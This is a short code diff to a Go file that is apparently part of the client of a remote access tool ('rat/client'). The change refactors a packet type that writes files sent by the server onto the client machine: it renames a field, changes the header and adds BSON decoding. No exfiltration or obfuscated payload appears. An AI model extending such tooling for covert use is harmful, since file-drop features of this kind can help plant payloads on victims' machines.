@@ -3,12 +3,14 @@ package main
 import (
 	"os"
 	"rat/client/network/header"
+
+	"gopkg.in/mgo.v2/bson"
 )
 
 type DownloadPacket struct {
 	File  string `network:"receive"`
 	Final bool   `network:"receive"`
-	Part  []byte `network:"receive"`
+	Data  []byte `network:"receive"`
 }
 
 type TransfersMap map[string]*os.File
@@ -20,7 +22,11 @@ func init() {
 }
 
 func (packet DownloadPacket) Header() header.PacketHeader {
-	return header.PutFileHeader
+	return header.UploadToClientHeader
+}
+
+func (packet *DownloadPacket) Init() {
+
 }
 
 func (packet DownloadPacket) OnReceive() error {
@@ -36,7 +42,7 @@ func (packet DownloadPacket) OnReceive() error {
 	}
 
 	w := Transfers[file]
-	_, err = w.Write(packet.Part)
+	_, err = w.Write(packet.Data)
 
 	if err != nil {
 		return err
@@ -58,4 +64,9 @@ func (packet DownloadPacket) OnReceive() error {
 	}
 
 	return err
+}
+
+func (packet DownloadPacket) Decode(buf []byte) (IncomingPacket, error) {
+	err := bson.Unmarshal(buf, &packet)
+	return packet, err
 }
